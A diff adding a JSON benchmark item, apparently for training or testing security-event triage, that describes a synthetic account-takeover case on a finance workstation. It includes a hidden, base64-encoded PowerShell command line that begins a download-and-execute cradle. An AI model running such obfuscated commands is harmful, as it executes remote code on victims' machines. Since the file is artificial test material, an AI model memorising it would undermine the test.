@@ -1,0 +1,115 @@
+{
+  "base_scenario_id": "SCN-ATO-001",
+  "base_time_utc": "2026-09-09T14:15:20.123000+00:00",
+  "case_id": "SUFC-fc4d9b179d",
+  "entities": [
+    {
+      "entity_type": "file_hash",
+      "entity_value": "852d67f20d304c828fa44e50e730c66f",
+      "event_keys": [
+        "e0"
+      ]
+    },
+    {
+      "entity_type": "file_hash",
+      "entity_value": "a697368b25a0b7ec9aebee3fece92ce9d0e76f4b84bbda5701fea28a6635a33d",
+      "event_keys": [
+        "e0"
+      ]
+    },
+    {
+      "entity_type": "host",
+      "entity_value": "CORP-FIN-WS01",
+      "event_keys": [
+        "e0"
+      ]
+    },
+    {
+      "entity_type": "process",
+      "entity_value": "explorer.exe",
+      "event_keys": [
+        "e0"
+      ]
+    },
+    {
+      "entity_type": "process",
+      "entity_value": "powershell.exe",
+      "event_keys": [
+        "e0"
+      ]
+    },
+    {
+      "entity_type": "user",
+      "entity_value": "corp\\victim_user",
+      "event_keys": [
+        "e0"
+      ]
+    },
+    {
+      "entity_type": "domain",
+      "entity_value": "corroboration-c113b065.example",
+      "event_keys": [
+        "e0",
+        "e_corr"
+      ]
+    },
+    {
+      "entity_type": "ip",
+      "entity_value": "203.0.114.9",
+      "event_keys": [
+        "e_corr"
+      ]
+    }
+  ],
+  "events": [
+    {
+      "action": "started",
+      "attributes": {
+        "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACk",
+        "EventID": "1",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ProcessGuid": "{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}",
+        "ProcessId": "5412",
+        "UtcTime": "2026-09-09 14:15:20.123"
+      },
+      "event_id": "1",
+      "event_type": "process_creation",
+      "key": "e0",
+      "outcome": "success",
+      "raw_evidence_sha256": "b152e107b24a6d9a0ad48b42f72ff89ca3414d751e367ddf1b53145dbde1bace",
+      "severity": "informational",
+      "source_identifier": "CORP-FIN-WS01",
+      "summary": "process_creation started",
+      "timestamp_offset_s": 0.0
+    },
+    {
+      "action": "connect",
+      "attributes": {
+        "note": "synthetic corroborating observation"
+      },
+      "event_id": "3",
+      "event_type": "network_connection",
+      "key": "e_corr",
+      "outcome": "success",
+      "raw_evidence_sha256": "015647cc0879389cbaf83e442f3ca6ba1ccd97e0a1c76f0fa7ec1caeee17a0cc",
+      "severity": "informational",
+      "source_identifier": "CORP-FIN-WS01",
+      "summary": "outbound connection observed by a second sensor",
+      "timestamp_offset_s": 30.0
+    }
+  ],
+  "family": "atomic_technique",
+  "omitted_events": 0,
+  "question": {
+    "root_event_key": "e0",
+    "target_hosts": [
+      "CORP-FIN-WS01"
+    ]
+  },
+  "split": "dev",
+  "transform": "independently_corroborated",
+  "window": {
+    "end_offset_s": 31.0,
+    "start_offset_s": -1.0
+  }
+}
